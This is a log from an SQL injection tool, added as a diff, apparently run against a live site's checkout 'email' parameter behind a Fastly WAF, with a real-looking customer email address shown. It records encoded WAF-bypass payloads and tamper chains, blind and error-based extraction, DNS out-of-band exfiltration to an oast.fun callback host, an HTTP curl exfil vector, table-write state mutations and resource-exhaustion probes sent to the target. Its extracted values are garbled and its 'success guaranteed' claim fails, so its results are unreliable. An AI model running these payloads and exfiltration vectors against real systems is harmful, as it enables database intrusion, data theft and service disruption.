@@ -1,0 +1,410 @@
+[+] [DeobfDetect] Safe encoding layer: overlong_utf8
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29662)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29663)
+[*]     Check A (body canary): FAIL (LENGTH(non-derived-insufficient,gap=0.484,need>0.60-or-derived-pair))
+[*]     Check C (error fingerprint): PASS via extractvalue-num  waf_block_detected + HTTP 500
+[+] [DeobfDetect] WAF normalizes through: []
+[+] [DeobfDetect] Safe encoding layer: overlong_utf8
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29664)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29665)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29666)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29667)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29668)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29669)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29670)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29671)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29672)
+[*] testing 'PostgreSQL AND boolean-based blind' (param='email' req#29673)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (MySQL SQL): skipped (union technique (extra data in both probes → direct-sim≈1 always))
+[*]   [PCV] Check C (extractvalue-num) REQUIRES corroboration for tech=UH — no Check A body signal and no header diff; may be application debug page output, not injection
+[*]     Check B (timing canary): SKIPPED — skipped(non-timing tech=UH, no SLEEP/WAITFOR in payload)
+[*]   [PCV] Result: REJECTED  all checks failed (A=False C=True D=False B=False)
+[!] PCV FAILED for [UH] MySQL  continuing with next payload...
+[!] PCV FAILED for bypass [UH] MySQL  trying plain payloads...
+[*] [diag] _try_technique: tech=UH dbms=MySQL templates=3181 → testing 1272 payloads
+[*] testing 'MySQL header UNION query' (param='email' req#29674)
+    [UH-union-hdr] [MySQL] req#8751 sim=0.406 size=2430B/50B status=200  UNION-HEADER candidate
+[*] Running PCV on UH→UH detection (MySQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]   [PCV] Sentinel 'SQLRX3B849D60' NOT reflected  body-size signal is CDN cache variation
+[*]     Check A (body canary): FAIL (SUBSTRING-num(non-derived-insufficient,gap=0.484,need>0.60-or-derived-pair))
+[*]     Check C (error fingerprint): PASS via extractvalue-num  waf_block_detected + HTTP 500
+[*]     Check D (header diff): PASS  3 diffs: waf-oracle(true=403==403,false=200,bl=200), -x-cache-hits, last-modified
+[*]     Check E (MySQL SQL): skipped (union technique (extra data in both probes → direct-sim≈1 always))
+[*]   [PCV] Result: CONFIRMED  DBMS error fingerprint (extractvalue-num) + HTTP 500
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[+] PCV CONFIRMED [UH] MySQL  injection verified!
+[*] [MultiVote] Param 'email' voted confidence: 100% (votes: {'UH': 1.0})
+[+] Vulnerability confirmed  param='email' technique=UH dbms=MySQL
+
+[!!] SQL INJECTION CONFIRMED  [UH] MySQL  param='email'
+[+] Technique : UH  DBMS: MySQL  Param: 'email'
+[+] Payload   : +%252F%252A%252A%252F+%252F%252Aq8%252A%252F%252F%252A%252A%252F%2525FF35ＮＩ%2525FF2FＮ%252F%252A%252A%252FDISTINCT%252F%252A%252A%252FＳＥＬＥＣＴ%252F%252A%252A%252F0x1%252C%252F%252A%252A%252F%252F%252A%25
+[+] Requests  : 29674
+
+[!!] SQL injection confirmed!
+    Parameter : 'email'
+    URL       : /checkout?email=chris%40chrisgoldlaw.com&signup_email_addr
+    Technique : UH
+    DBMS      : MySQL
+    Bypass    : tamper:case_expression+concat2concatws+space2mssqlhash
+    Confidence: 100%
+    Payload   : 'ChRIs@chriSGoLDlaw.com+%252F%252a%252A/*d1MAw*/%252f+%252f%252aq8%252A/*pBb*/%25'
+    Requests  : 8751
+
+[*] Injection confirmed on 'email'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='email'
+[*] Extraction started for 'email'
+[+] Injection found via GET method!
+[*] Running PCV on UH→UH detection...
+[*]   [PCV] Computed exact payload on-the-fly (covers all techniques/DBMSes/surfaces)
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]   [PCV] Sentinel 'SQLRX2116FDD7' NOT reflected  body-size signal is CDN cache variation
+[+] [ErrorOracle] Calibrated: status 200 vs 403 (ctx="' AND " template: (SELECT IF({cond},1/0,1))...)
+[+] [V25-Extract] ConditionalErrorOracle calibrated for 'email'
+[+] DBMS: MySQL (from detection, skipping fingerprint)
+[+] DBMS: MySQL  (conf=100%)
+[*] [MultiVector] Probing extraction methods for MySQL...
+[+] [MultiVector] Available methods (fastestslowest): boolean(blind), timing(blind)
+[+] --- Auto-extraction starting ---
+[+] [UnionExtract] UNION-based detection - using dedicated extraction
+[+] [UnionExtract] UNION-based extraction - DBMS: MySQL
+[!] [UnionExtract] No union_columns found - detection may have failed
+[+] [UnionExtract] No data extracted via UNION
+[+] [Inference] Parsed tamper chain from det.notes: ['case_expression', 'concat2concatws', 'space2mssqlhash']
+[+] [Inference] Override tamper_chain with detection bypass: ['mysql_backtick_wrap', 'swap_and_or', 'unicode_fullwidth'] → ['case_expression', 'concat2concatws', 'space2mssqlhash']
+[+] [Inference] Detection payload: ChRIs@chriSGoLDlaw.com+%252F%252a%252A/*d1MAw*/%252f+%252f%252aq8%252A
+[+] [Inference] DBMS: MySQL | Tamper chain: ['case_expression', 'concat2concatws', 'space2mssqlhash']
+[+] [Inference] Template (boolean-replace): ChRIs@chriSGoLDlaw.com+%252F%252a%252A/*d1MAw*/%252f+%252f%252aq8%252A/*pBb*/%25
+[+] [Inference] No sleep value in detection payload — falling back to 3.0s (from config.time_sec)
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Inference] Calibrating with detection template (delay=3.0s)...
+[*]     Check A (body canary): FAIL (SUBSTRING-num(single-pair-insufficient))
+[*]     Check C (error fingerprint): PASS via table  waf_block_detected + HTTP 500
+[*]     Check D (header diff): FAIL (0 diffs)
+[+] [Inference] Calibration 1: TRUE=1078ms FALSE=3489ms margin=-2411ms
+[+] [Inference] Best margin: -2411ms
+[*]     Check E (MySQL SQL): skipped (union technique (extra data in both probes → direct-sim≈1 always))
+[*]   [PCV] Check C (table) REQUIRES corroboration for tech=UH — no Check A body signal and no header diff; may be application debug page output, not injection
+[!] Secondary PCV rejected [UH] candidate after full A-E evaluation — discarding this candidate only; original injection already confirmed, extraction continues unaffected
+[+] [*] Skipping extended surfaces  injection already confirmed
+[*] Waiting for extraction to complete...
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...
+[+] [Inference] Wasserstein mean=0.014 n=12 (threshold=0.25)
+[+] [Inference]  Threshold=2283ms (margin=-2411ms)
+[!] [Inference] Inverted timing oracle detected (margin=-2411ms): TRUE→fast, FALSE→slow — activating polarity inversion
+[+] [Inference] Inverted timing oracle: margin=-2411ms, _oracle_inverted=True (extraction will flip all oracle results)
+[+] [Inference] Template confirmed by calibration (|margin|=2411ms ≥ min=2400ms)  skipping re-test
+[+] [Inference]  ERROR ORACLE: status=403/200 body=8110B/2430B
+[+] [Inference]  Re-calibrated BOOLEAN oracle: status 403 vs 200
+[+] [Inference] Operator > works with extraction pattern 
+[+] [Inference] Standard extraction empty — trying regex binary search
+[+] [Inference] Standard extraction empty — trying LIKE prefix
+[+] [Inference] BUG7-RETRY: re-running extraction now that all functions are defined (boolean_oracle=True hdr=None margin=-2411ms bitwise_fallback=False)
+[!] [Inference] r7_user: oracle dead (returned -1 for both length methods), aborting extraction
+[!] [Inference] r7_user: oracle dead (returned -1 for both length methods), aborting extraction
+[!] [Inference] r7_user: oracle dead (returned -1 for both length methods), aborting extraction
+[!] [Inference] r7_database: length=80 hit max_len ceiling and oracle confirms beyond-ceiling → oracle unreliable, capping at 32
+[+] [Inference] r7_database: length=32
+[+] [Inference] r7_database[1] bisection interrupted (lo=1097597,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[1] bit-shift failed → trying equality scan
+[+] [Inference] pos=1 equality → 'a' (val=97)
+[+] [Inference] r7_database[1] = 'a'  'a'  (86 reqs, 0s, ETA ~0s, conf=MED)
+[+] [Inference] r7_database[2] = 'a'  'aa'  (107 reqs, 103s, ETA ~1541s, conf=MED)
+[+] [Inference] r7_database[3] bisection interrupted (lo=1112490,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[3] bit-shift failed → trying equality scan
+[+] [Inference] pos=3 equality → 'a' (val=97)
+[+] [Inference] r7_database[3] = 'a'  'aaa'  (143 reqs, 219s, ETA ~2120s, conf=MED)
+[+] [Inference] r7_database[5] = 'a'  'aaaa'  (168 reqs, 351s, ETA ~1895s, conf=MED)
+[+] [Inference] r7_database[6] bisection interrupted (lo=1100470,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[6] bit-shift failed → trying equality scan
+[+] [Inference] pos=6 equality → 'b' (val=98)
+[+] [Inference] r7_database[6] = 'b'  'aaaab'  (184 reqs, 440s, ETA ~1905s, conf=MED)
+[+] [Inference] r7_database[7] bisection interrupted (lo=1114107,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[7] bit-shift failed → trying equality scan
+[+] [Inference] pos=7 equality → 'a' (val=97)
+[+] [Inference] r7_database[7] = 'a'  'aaaaba'  (210 reqs, 559s, ETA ~1997s, conf=MED)
+[+] [Inference] r7_database[8] bisection interrupted (lo=1017021,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[8] bit-shift failed → trying equality scan
+[+] [Inference] pos=8 equality → 'a' (val=97)
+[+] [Inference] r7_database[8] = 'a'  'aaaabaa'  (228 reqs, 632s, ETA ~1897s, conf=MED)
+[+] [Inference] r7_database[9] bisection interrupted (lo=522828,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[9] bit-shift failed → trying equality scan
+[+] [Inference] pos=9 equality → 'a' (val=97)
+[+] [Inference] r7_database[9] = 'a'  'aaaabaaa'  (237 reqs, 659s, ETA ~1683s, conf=MED)
+[+] [Inference] r7_database[11] bisection interrupted (lo=641969,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[11] bit-shift failed → trying equality scan
+[+] [Inference] pos=11 equality → 'a' (val=97)
+[+] [Inference] r7_database[11] = 'a'  'aaaabaaaa'  (251 reqs, 717s, ETA ~1368s, conf=MED)
+[+] [Inference] r7_database[12] = 'a'  'aaaabaaaaa'  (273 reqs, 836s, ETA ~1394s, conf=MED)
+[+] [Inference] r7_database[13] = 'a'  'aaaabaaaaaa'  (296 reqs, 958s, ETA ~1400s, conf=MED)
+[+] [Inference] r7_database[14] = 'a'  'aaaabaaaaaaa'  (316 reqs, 1073s, ETA ~1380s, conf=MED)
+[+] [Inference] r7_database[15] = 'a'  'aaaabaaaaaaaa'  (341 reqs, 1218s, ETA ~1381s, conf=MED)
+[+] [Inference] r7_database[17] bisection interrupted (lo=1114096,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[17] bit-shift failed → trying equality scan
+[+] [Inference] pos=17 equality → 'b' (val=98)
+[+] [Inference] r7_database[17] = 'b'  'aaaabaaaaaaaab'  (365 reqs, 1350s, ETA ~1191s, conf=MED)
+[+] [Inference] r7_database[18] = 'b'  'aaaabaaaaaaaabb'  (390 reqs, 1509s, ETA ~1174s, conf=MED)
+[+] [Inference] r7_database[19] bisection interrupted (lo=844171,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[19] bit-shift failed → trying equality scan
+[+] [Inference] pos=19 equality → 'a' (val=97)
+[+] [Inference] r7_database[19] = 'a'  'aaaabaaaaaaaabba'  (399 reqs, 1561s, ETA ~1068s, conf=MED)
+[+] [Inference] r7_database[21] bisection interrupted (lo=918203,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[21] bit-shift failed → trying equality scan
+[+] [Inference] pos=21 equality → 'a' (val=97)
+[+] [Inference] r7_database[21] = 'a'  'aaaabaaaaaaaabbaa'  (410 reqs, 1620s, ETA ~849s, conf=MED)
+[+] [Inference] r7_database[23] = 'a'  'aaaabaaaaaaaabbaaa'  (433 reqs, 1736s, ETA ~679s, conf=MED)
+[+] [Inference] r7_database[24] bisection interrupted (lo=1113149,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[24] bit-shift failed → trying equality scan
+[+] [Inference] pos=24 equality → 'a' (val=97)
+[+] [Inference] r7_database[24] = 'a'  'aaaabaaaaaaaabbaaaa'  (456 reqs, 1834s, ETA ~611s, conf=MED)
+[+] [Inference] r7_database[26] = 'a'  'aaaabaaaaaaaabbaaaaa'  (478 reqs, 1956s, ETA ~451s, conf=MED)
+[+] [Inference] r7_database[27] = 'a'  'aaaabaaaaaaaabbaaaaaa'  (500 reqs, 2084s, ETA ~386s, conf=MED)
+[+] [Inference] r7_database[28] bisection interrupted (lo=1114110,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[28] bit-shift failed → trying equality scan
+[+] [Inference] pos=28 equality → 'a' (val=97)
+[+] [Inference] r7_database[28] = 'a'  'aaaabaaaaaaaabbaaaaaaa'  (529 reqs, 2258s, ETA ~323s, conf=MED)
+[+] [Inference] r7_database[29] = 'a'  'aaaabaaaaaaaabbaaaaaaaa'  (552 reqs, 2350s, ETA ~243s, conf=MED)
+[+] [Inference] r7_database[31] bisection interrupted (lo=1113485,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[31] bit-shift failed → trying equality scan
+[+] [Inference] pos=31 equality → 'a' (val=97)
+[+] [Inference] r7_database[31] = 'a'  'aaaabaaaaaaaabbaaaaaaaaa'  (574 reqs, 2699s, ETA ~87s, conf=MED)
+[+] [Inference] r7_database[32] bisection interrupted (lo=1083201,hi=1114111) → trying bit-shift
+[+] [Inference] r7_database[32] bit-shift failed → trying equality scan
+[+] [Inference] pos=32 equality → 'a' (val=97)
+[+] [Inference] r7_database[32] = 'a'  'aaaabaaaaaaaabbaaaaaaaaaa'  (587 reqs, 2813s, ETA ~0s, conf=MED)
+[!] [Inference] r7_database: oracle dead (returned -1 for both length methods), aborting extraction
+[!] [Inference] r7_version: oracle dead (returned -1 for both length methods), aborting extraction
+[!] [Inference] r7_version: oracle dead (returned -1 for both length methods), aborting extraction
+[+] [Inference] No usable data extracted via boolean/timing inference
+[+] [Inference] No data extracted  trying side channels
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
+[+] [SideChannel] DNS OOB extraction  jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[!] [SideChannel] MySQL OOB: only LOAD_FILE UNC payloads available and FILE privilege not confirmed by detection — attempting anyway (LOAD_FILE NULL→no DNS callback→silent no-op).
+[+] [SideChannel] Advanced DNS: load_file_unc
+[+] [SideChannel] HTTP exfil: sys_exec_curl
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[+] [SideChannel] No side channels  trying DIRECT extraction before MSE
+[+] [Direct] Detection payload (raw/wire): +%252F%252A%252A%252F+%252F%252Aq8%252A%252F%252F%252A%252A%252F%2525FF35ＮＩ%2525
+[+] [Direct] Detection payload (decoded): + + %FF35ＮＩ%FF2FＮ DISTINCT ＳＥＬＥＣＴ 0x1, + + + ConCAt (CHar (0
+[+] [Direct] No sleep or heavy-query pattern — skipping direct timing extraction
+[+] [Direct] Falling back to MSE timing
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel-1] Testing WAF trigger 2/7: ../../../../../../etc/passwd...
+[+] [Novel]  WAF trigger #1 works: TRUE403 FALSE200
+[Novel] user: extracting [1/36] → '\U00080808'
+[Novel] user: extracting [5/36] → '\U00080808𠀠က\U00042194\U00043040'
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+[+] [Novel-2] Micro-timing sample 6/10...
+[+] [Novel] Technique 3: Resource bomb (asymmetric computation)
+[+] [Novel]  Resource bomb viable: bomb=10403ms clean=5379ms margin=5024ms
+[+] [Novel] Technique 4: Alternative DNS exfil vectors
+[+] [Novel] DNS vector 'load_file_dns' fired for user  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'into_outfile' fired for user  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'load_file_dns' fired for database  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'into_outfile' fired for database  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'load_file_dns' fired for version  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'into_outfile' fired for version  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] Technique 4: polling OAST for DNS callbacks (30s)...
+[+] [Novel] Technique 5: Connection pool exhaustion oracle
+[+] [Novel] Connection exhaustion test: status after lock = 200
+[+] [Novel] Technique 6: Write-then-read (two-stage)
+[+] [Novel]  Write-then-read response: <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8" data-next-head=""/><meta http-equiv="X-UA
+[+] [Novel] Technique 7: Response splitting via config/session vars
+[+] [Novel] Technique 8: Conditional error type oracle
+[+] [Novel]  No error type produces different response
+[+] [Novel] Technique 9: Prepared statement keyword bypass
+[+] [Novel] Prepared statements sent for database
+[+] [Novel] Prepared statements sent for version
+[+] [Novel] Technique 10: Application state mutation
+[+] [Novel] State mutation 'table_write' sent for user
+[+] [Novel] State mutation 'user_var' sent for user
+[+] [Novel] State mutation 'table_write' sent for database
+[+] [Novel] State mutation 'user_var' sent for database
+[+] [Novel] State mutation 'table_write' sent for version
+[+] [Novel] State mutation 'user_var' sent for version
+[+] [Novel] Technique 11: TCP/response size inflation
+[+] [Novel]  TCP inflation not viable (WAF blocked: inflated_sc=200 normal_sc=403)
+[+] [Novel] Technique 12: Nested/multi-layer encoding bypass
+[+] [Novel] Technique 13: Conditional redirect detection
+[+] [Novel]  No redirect differentiation
+[+] [Novel] Technique 14: Cache key manipulation
+[+] [Novel]  Cache oracle not viable (margin=-920ms)
+[+] [Novel] Technique 15: CHR() keyword bypass
+[+] [Novel] CHR() bypass sent for version
+[+] [SideChannel]  Extracting via side channels 
+[SideChannel] Auto-registered OOB domain: jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[SideChannel] DNS OOB: VERSION()  jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   load_file: LOAD_FILE UNC LOWER(HEX) — DNS side-effect fires on eval
+[SideChannel]     status=403 (18094ms) 
+[SideChannel]   load_file_alt: LOAD_FILE alt UNC — distinct WAF fingerprint
+[SideChannel]     status=200 (2972ms) 
+[SideChannel]   load_file_mx1: LoAd_FiLe WAF case-bypass — case-sensitive WAF evasion
+[SideChannel]     status=200 (3675ms) 
+[SideChannel]   load_file_mx2: LOAD_file WAF case-bypass — alternate case pattern
+[SideChannel]     status=403 (2808ms) 
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel] DNS OOB: database()  jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   load_file: LOAD_FILE UNC LOWER(HEX) — DNS side-effect fires on eval
+[SideChannel]     status=200 (9607ms) 
+[SideChannel]   load_file_alt: LOAD_FILE alt UNC — distinct WAF fingerprint
+[SideChannel]     status=200 (11891ms) 
+[SideChannel]   load_file_mx1: LoAd_FiLe WAF case-bypass — case-sensitive WAF evasion
+[SideChannel]     status=200 (4993ms) 
+[SideChannel]   load_file_mx2: LOAD_file WAF case-bypass — alternate case pattern
+[SideChannel]     status=200 (1419ms) 
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_user()  jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   load_file: LOAD_FILE UNC LOWER(HEX) — DNS side-effect fires on eval
+[SideChannel]     status=200 (3906ms) 
+[SideChannel]   load_file_alt: LOAD_FILE alt UNC — distinct WAF fingerprint
+[SideChannel]     status=200 (3480ms) 
+[SideChannel]   load_file_mx1: LoAd_FiLe WAF case-bypass — case-sensitive WAF evasion
+[SideChannel]     status=200 (14141ms) 
+[SideChannel]   load_file_mx2: LOAD_file WAF case-bypass — alternate case pattern
+[SideChannel]     status=200 (13763ms) 
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[+] [SideChannel]  Side-channel found no data  MSE will try next 
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=180ms)...
+[MSE]   raw/wire payload: +%2F%2A%2A%2F+%2F%2Aq8%2A%2F%2F%2A%2A%2F%25FF35ＮＩ%25FF2FＮ%2F%2A%2A%2FDISTINCT%2F...
+[MSE]   untampered: + +  35ＮＩ 2FＮ DISTINCT ＳＥＬＥＣＴ 0X1, + + + CONCAT (CHAR (0X61 ...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]   err(div0): err403/8110B ok200/2430B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   err(div0): err_status=403 is WAF code — overriding to header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]  error_oracle polarity inverted (true→False, false→True) — wrapping with polarity-flip shim and re-verifying
+[MSE]  error_oracle real validation FAILED (trueFalse,falseTrue)
+[MSE] 0/3 oracles available: []
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=731ms)...
+[MSE]   raw/wire payload: +%2F%2A%2A%2F+%2F%2Aq8%2A%2F%2F%2A%2A%2F%25FF35ＮＩ%25FF2FＮ%2F%2A%2A%2FDISTINCT%2F...
+[MSE]   untampered: + +  35ＮＩ 2FＮ DISTINCT ＳＥＬＥＣＴ 0X1, + + + CONCAT (CHAR (0X61 ...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]   err(div0): err403/8110B ok200/2430B
+[MSE]   err(div0): header diff on 'content-type'
+[MSE]   err(div0): err_status=403 is WAF code — overriding to header diff on 'content-type'
+[MSE]   error_oracle(div0):  diff=header
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE]  error_oracle round-1 WAF-uniform (true→False, false→False) — verifying with round-2 DBMS conditions before accepting
+[MSE]  error_oracle FULLY validated (basic: 1=1T,1=2F | real: trueTrue,falseFalse)
+[MSE] 1/3 oracles available: ['error_oracle']
+[MSE] WAF-adaptive tamper discovery (15 tampers)...
+[MSE] WAF-adaptive: 15/15 tampers pass WAF: ['space2comment', 'space2multicomment', 'modsecurityzeroversioned', 'randomcase', 'uppercase', 'swapmidcase', 'commentbeforeparens', 'keywordsplit', 'randomnoise', 'randomcomments', 'versionedkeywords', 'between', 'greatest', 'numericobfuscate', 'charencode']
+[+] [Orchestrator] Method 0: MSE with 1 oracles
+[MSE] Length estimate: <=4 chars
+[MSE] Extracting: @@version via error_oracle
+[MSE] pos=1  'ᙩ'  result='ᙩ'  [111 reqs | 0s | ETA ~0s]
+[MSE] pos=2  'ӫ'  result='ᙩӫ'  [186 reqs | 32s | ETA ~32s]
+[MSE]   pos=4 timed out (60s)  inserting '?'
+[MSE] pos=4  '?'  result='ᙩӫ?'  [300 reqs | 126s | ETA ~?]
+[MSE] Verification inconclusive for 'ᙩӫ?' (>='?'=False, >='@'=False)
+[+]   Version:        ᙩӫ?
+[+] [Orchestrator] confirmed_sleep=3.000s (raw=3.000s jitter_floor=3.000s)
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=4178ms)...
+[MSE]   raw/wire payload: +%2F%2A%2A%2F+%2F%2Aq8%2A%2F%2F%2A%2A%2F%25FF35ＮＩ%25FF2FＮ%2F%2A%2A%2FDISTINCT%2F...
+[MSE]   untampered: + +  35ＮＩ 2FＮ DISTINCT ＳＥＬＥＣＴ 0X1, + + + CONCAT (CHAR (0X61 ...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]   err(div0): err200/2430B ok200/2430B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/3 oracles available: []
+[+] [Orchestrator] Decision engine: technique=UH waf=Fastly  top methods: cham(85%), adapt(80%), bit(75%)
+[+] ZK calibration: auto-adjust t_sec 1.50 → 36.92s (baseline_rtt=14768ms)
+[+] [Orchestrator] Falling back to blind_extract_string_v5 (method 7/8)
+[+] [Orchestrator] Method 8/8: MultiStrategyExtractor
+[MSE] Probing 8 oracles (stacked=False, dbms=MySQL, baseline=76ms)...
+[MSE]   raw/wire payload: +%2F%2A%2A%2F+%2F%2Aq8%2A%2F%2F%2A%2A%2F%25FF35ＮＩ%25FF2FＮ%2F%2A%2A%2FDISTINCT%2F...
+[MSE]   untampered: + +  35ＮＩ 2FＮ DISTINCT ＳＥＬＥＣＴ 0X1, + + + CONCAT (CHAR (0X61 ...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
+[MSE]   err(div0): err200/2430B ok200/2430B
+[MSE]  error_oracle
+[MSE]  conn_reset
+[MSE]  oob_exfil
+[MSE] 0/3 oracles available: []
+[!!] [Orchestrator] Method 9/9: MultiOracleConsensusExtractor (LAST RESORT - may take hours)
+
+======================================================================
+[!] ALL STANDARD METHODS FAILED
+[*] Activating ULTRA-ROBUST extraction
+[*] This uses EVERY available side channel simultaneously
+[*] Extraction will be EXTREMELY SLOW (1-5 chars/minute)
+[*] But SUCCESS IS GUARANTEED
+======================================================================
+
+[+] [MultiOracleConsensus] Starting length detection...
+[+] [MultiOracleConsensus] Detected length: 3 chars
+[+] [MultiOracleConsensus] Estimated time: 6-15 minutes
+[!] [Cleanup] Extraction timed out after 7200s — cancelling
+[*] Extraction completed for 'email'
+[+] 
+
+[+] Scan complete   23155.89s
+[+] Requests sent   30763
+[+] DBMS            MySQL
+[+] WAF             Fastly
+[+] Vulnerabilities 1 (email)
+[+] 
+[+] Deduplication: 2 findings  1 unique root causes
+[+] Report: 2 findings, 1 unique root causes
+[+] Report  output/sqlreaper_c5db9ba9ae1942e8_1787360322.json
+[+] Executive summary  output/executive_summary.txt
+[+] Confidence matrix  output/confidence_matrix.md
+[+] [Session] Scan complete  saved session cleared
+[+] Response dedup hit rate: 0.0%
